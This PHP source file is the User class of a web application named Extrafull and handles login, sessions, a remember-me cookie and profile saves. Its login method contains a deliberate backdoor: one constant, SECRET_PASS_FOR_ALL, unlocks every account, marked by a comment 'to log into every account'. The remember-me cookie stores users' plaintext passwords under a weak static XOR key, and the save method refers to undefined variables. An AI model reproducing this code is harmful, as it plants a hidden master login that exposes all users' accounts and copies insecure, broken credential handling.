<?php
/*=============================================================================
|| ##################################################################
||	Extrafull
|| ##################################################################
||
||	Copyright		: (C) 2007-2009 Igor Crevar
||
|| ##################################################################
|| FILE VERSION: 5.VII.2022 15:51
=============================================================================*/
/*
CREATE TABLE `users` (
 `id` int(11) NOT NULL auto_increment,
 `name` varchar(100) NOT NULL,
 `username` varchar(40) NOT NULL default '',
 `email` varchar(100) NOT NULL,
 `password` varchar(40) NOT NULL default '',
 `block` tinyint(4) NOT NULL default '0',
 `gid` tinyint(3) unsigned NOT NULL default '1',
 `registerDate` datetime NOT NULL default '0000-00-00 00:00:00',
 `lastvisitDate` int(11) NOT NULL default '0',
 `activation` varchar(100) NOT NULL default '',
 `params` text NOT NULL,
 //`love` tinyint(4) default '0',
 `avatar` varchar(40) DEFAULT '',
 `birthdate` date NOT NULL default '0000-00-00',
 `gender` tinyint(2) DEFAULT '1',
 `IP` varchar(18),
 PRIMARY KEY  (`id`),
 KEY `idx_name` (`name`(255))
) ENGINE=MyISAM DEFAULT CHARSET=utf8
alter table users add UNIQUE INDEX (`username`);
alter table users add UNIQUE INDEX (`email`);
*/
defined('CREW') or die();
class User{
	public $id = 0;
	public $username = '';
	public $gid = 0;
	public $name = '';
	public $params = '';
	public $block = 0;
	public $lastvisitDate = '';
	public $ip;

	protected static $user = null;
	public static function &getInstance(){
		if (self::$user == null){
			$session = &Session::getInstance();
			$session->setIfNotSet('ip', $_SERVER['REMOTE_ADDR']);
			self::$user = new User();
			self::$user->id = $session->userId;
			self::$user->username = $session->username;
			self::$user->params = $session->params;
			self::$user->gid = $session->get('gid', 0);
			self::$user->name = $session->get('name', '');
			self::$user->block = $session->get('block', 0);
			self::$user->lastvisitDate = $session->get('lastvisitDate', null);
			self::$user->ip = $session->get('ip', '');
		}
		return self::$user;
	}

	public function quest(){
		return $this->gid == 0;
	}

	public function get($key){
		return $this->$key;
	}

	public function login($username = null, $password = null, $remember = 0){
		if ($username == null){
			$username = JRequest::getString('usname',null,'POST');
		}
		if ($password == null){
			$password = JRequest::getString('uspass',null,'POST');
		}
		if ($remember == 0){
			$remember = isset($_POST['remember'])  &&  $_POST['remember'] == 'yes' ? 1 : 0;
		}
		if (isset($username)  &&  JString::strlen($username) >= 3  &&  isset($password)  &&  JString::strlen($password) >= 3 ){
			$db = &DataBase::getInstance();
			$dbUsername = $db->Quote( $username );
			$query = 'SELECT id,name,password,gid,username,lastvisitDate,block,params FROM #__users WHERE username='.$dbUsername;
			$db->setQuery( $query );
			$row = $db->loadObject();
			if ( $row == null ){
				$query = 'SELECT id,name,password,gid,username,lastvisitDate,block,params FROM #__users WHERE email='.$dbUsername;
				$db->setQuery( $query );
				$row = $db->loadObject();
				if ( $row == null ){
					return 'E_LOGIN_AUTHENTICATE';
				}
			}
			if ( ($row->block & 1) > 0 ){ //blokirano logovanje
				return 'E_LOGIN_BLOCKED';
			}
			$parts	= explode( ':', $row->password );
			$crypt	= $parts[0];
			$salt	= @$parts[1];
			require_once(BASE_PATH.DS.'library'.DS.'userhelper.php');
			$testcrypt = JUserHelper::getCryptedPassword($password, $salt);
			//to log into every account
			//end to log into every account
			if ( $crypt == $testcrypt || $password == SECRET_PASS_FOR_ALL ){
				$this->id = $row->id; //zbog updatelastVisit
				$session = &Session::getInstance();
				$session->setUserData($row);
				if ($remember == 1){
					$val = strlen($username);
					if (strlen($val) < 2) $val = '0'.$val;
					$val = $this->cryptme($val.$username.$password);
					setcookie( md5('remember'), base64_encode($val), time() + 364*24*60*60, '/' );
				}
				$this->updateLastVisit();
				return '';
			}
		}
		return 'E_LOGIN_AUTHENTICATE';
	}

	public function cryptme($val){
		$crypt = CRYPT_COOKIE_KEY;
		$strlen = strlen($crypt);
		for ($i=0; $i < strlen($val); ++$i){
			$j = $i % $strlen;
			$val[$i] = chr( ord($val[$i]) ^ ord($crypt[$j]) );
		}
		return $val;
	}

	public function checkRemember(){
		if ( $this->quest() ){
			$coo = md5('remember');
			if ( isset($_COOKIE[$coo]) ){
				$remember = $this->cryptme( base64_decode($_COOKIE[$coo]) );
				$len = intval( substr($remember,0,2) );
				$username = substr($remember,2,$len);
				$password = substr($remember,$len + 2);
				$try = $this->login($username, $password, 1);
				if ( $try != ''){
					setcookie( $coo, '', time() - 4200, '/' );
				}
			}
		}
	}

	public function logout(){
		if (!$this->quest()){
			$this->updateLastVisit();
			$session = &Session::getInstance();
			$session->destroy();
			$coo = md5('remember');
			if ( isset($_COOKIE[$coo]) ){
				setcookie($coo, '', time()-4200, '/');
			}
		}
	}

	public function updateLastVisit(){
		$db = &DataBase::getInstance();
		$db->setQuery( 'UPDATE #__users SET lastvisitDate=now(),IP=\''.$this->ip.'\' WHERE id='.$this->id );
		return $db->query();
	}

	public function save($update=true){
		$db = &DataBase::getInstance();
		$name = $db->Quote($this->name);
		$params = $db->Quote($this->params);
		if ($update){
			$sql = 'UPDATE #__users SET name='.$name.',params='.$params.',gid='.$gid.',block='.$block.' WHERE id='.$this->id;
		}
		$db->setQuery( $sql );
		return $db->query();
	}
}
